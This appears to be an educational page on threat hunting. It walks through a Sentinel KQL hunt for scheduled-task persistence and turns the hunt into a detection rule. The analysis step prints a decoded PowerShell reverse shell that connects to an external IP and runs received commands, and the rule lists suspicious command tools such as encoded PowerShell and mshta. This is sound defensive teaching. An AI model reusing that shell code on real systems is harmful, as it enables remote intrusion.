Threat Hunting

Threat hunting is the proactive, hypothesis-driven search for threats that have evaded existing detection mechanisms. Unlike alert-driven SOC work, hunting assumes the adversary is already present and seeks to find them before they achieve their objectives.

Reactive Detection vs. Proactive Hunting

Reactive: Alert-Driven SOC
  • Wait for SIEM/EDR to alert
  • Investigate known-bad signatures
  • Respond to what tools detect
  • Dependent on detection rules existing
  • Miss novel/custom attacks
  • Adversary sets the timeline

Gap: APT uses custom tooling with no signatures. Dwell time: 200+ days before detection.

Proactive: Threat Hunting
  • Assume breach, seek evidence
  • Hunt based on TTPs, not signatures
  • Query data for anomalies
  • Find threats without existing alerts
  • Discover novel attack patterns
  • Hunter sets the timeline

Benefit: Hunter queries for rare parent-child process relationships → finds APT's custom loader before data exfil.

The Hunting Process

Hunt Example: Living-off-the-Land Persistence

Hypothesis: Attacker using scheduled tasks for persistence (T1053.005)
1
Form Hypothesis
Based on threat intel, APT groups are using scheduled tasks for persistence
Hypothesis
Threat Actor: APT29 (Cozy Bear)
Technique: T1053.005 - Scheduled Task/Job
Behavior: Create scheduled tasks that execute malicious
          payloads at system startup or on schedule

Hypothesis: "If APT29 has compromised our environment, 
they may have created scheduled tasks on domain-joined
systems to maintain persistence. I will hunt for 
suspicious scheduled task creations in the last 30 days."

Data Required:
  - Windows Security Event 4698 (scheduled task created)
  - Sysmon Event 1 (process creation)
  - EDR telemetry (schtasks.exe usage)
2
Query: Find All Scheduled Task Creations
Baseline query to understand normal volume
KQL - Microsoft Sentinel
// Baseline: All scheduled task creations (Event 4698)
SecurityEvent
| where TimeGenerated > ago(30d)
| where EventID == 4698
| extend TaskName = tostring(EventData.TaskName)
| extend TaskContent = tostring(EventData.TaskContent)
| summarize 
    Count = count(),
    Hosts = dcount(Computer)
    by TaskName
| order by Count desc

// Results:
// GoogleUpdate         | 847  | 423 hosts  (normal)
// MicrosoftEdgeUpdate  | 523  | 412 hosts  (normal)
// OneDriveStandalone   | 234  | 234 hosts  (normal)
// WindowsDefender      | 189  | 189 hosts  (normal)
// SysHealthCheck       | 3    | 1 host     (⚠️ suspicious)
// WinUpdate32          | 1    | 1 host     (⚠️ suspicious)
3
Pivot: Investigate Suspicious Tasks
Drill into low-count, unknown scheduled tasks
KQL - Deep Dive
// Investigate suspicious scheduled tasks
SecurityEvent
| where TimeGenerated > ago(30d)
| where EventID == 4698
| extend TaskName = tostring(EventData.TaskName)
| extend TaskContent = tostring(EventData.TaskContent)
| where TaskName in ("SysHealthCheck", "WinUpdate32")
| project 
    TimeGenerated,
    Computer,
    Account,
    TaskName,
    TaskContent

// Results:
┌─────────────────────┬──────────────┬─────────────────┬──────────────────┐
│ TimeGenerated       │ Computer     │ Account         │ TaskName         │
├─────────────────────┼──────────────┼─────────────────┼──────────────────┤
│ 2024-01-10 03:47:22 │ WKS-ADMIN01  │ CONTOSO\jsmith  │ SysHealthCheck   │
│ 2024-01-08 02:15:43 │ FILESRV02    │ CONTOSO\admin   │ WinUpdate32      │
└─────────────────────┴──────────────┴─────────────────┴──────────────────┘

// Task Content Analysis (SysHealthCheck):
// Action: powershell.exe -enc JABzAD0ATgBlAHcALQBP...
// ⚠️ RED FLAG: Encoded PowerShell command
// ⚠️ Created at 3:47 AM (off-hours)
// ⚠️ Created by user account, not SYSTEM
4
Finding: Malicious Persistence Confirmed
Decode the PowerShell, correlate with other events
Analysis
// Decoded PowerShell from scheduled task:
$s = New-Object Net.Sockets.TCPClient("185.234.72.19",443);
$stream = $s.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object Text.ASCIIEncoding).GetString($bytes,0,$i);
    $sendback = (iex $data 2>&1 | Out-String);
    ...
}

⚠️ CONFIRMED: Cobalt Strike beacon / reverse shell

Correlation - Process Tree on WKS-ADMIN01:
  svchost.exe (scheduled task service)
    └── powershell.exe -enc JABzAD0ATgBlAHcALQBP...
          └── Network connection to 185.234.72.19:443
          
Timeline:
  2024-01-08 02:15 - Initial access (phishing)
  2024-01-10 03:47 - Persistence established
  2024-01-10 03:48 - C2 callback initiated
  (Hunt date: 2024-01-15 - 5 day dwell time detected)

FINDING: TRUE POSITIVE - Active compromise
ACTION: Escalate to IR immediately
5
Improve: Create Detection Rule
Convert hunt query into automated detection
New Detection Rule
// Analytic Rule: Suspicious Scheduled Task Creation
// Severity: High
// MITRE: T1053.005

SecurityEvent
| where EventID == 4698
| extend TaskContent = tostring(EventData.TaskContent)
| where TaskContent has_any (
    "powershell",
    "-enc",
    "-encodedcommand",
    "cmd.exe /c",
    "mshta",
    "wscript",
    "cscript",
    "regsvr32"
)
| where TaskContent !has "Microsoft"  // Exclude legit
| where TaskContent !has "Google"
| project TimeGenerated, Computer, Account, TaskName, TaskContent

// Rule triggers:
// - Alert when scheduled task contains suspicious commands
// - Previously would have been missed
// - Hunt converted to automated detection ✓

Threat Hunting Best Practices

Hunting Success Factors

1. Start with a Hypothesis: Random queries aren't hunting. Start with "If attacker did X, I would see Y in data Z."

2. Use MITRE ATT&CK: Structure hunts around techniques. Cover one technique thoroughly before moving on.

3. Know Your Baseline: You can't find anomalies if you don't know what's normal. Profile your environment first.

4. Document Everything: Even negative results are valuable. Document queries, findings, and recommendations.

5. Convert Hunts to Detections: Every successful hunt should produce an automated detection rule.

6. Schedule Regular Hunts: Dedicate time weekly for hunting. It's not something to do "when you have time."
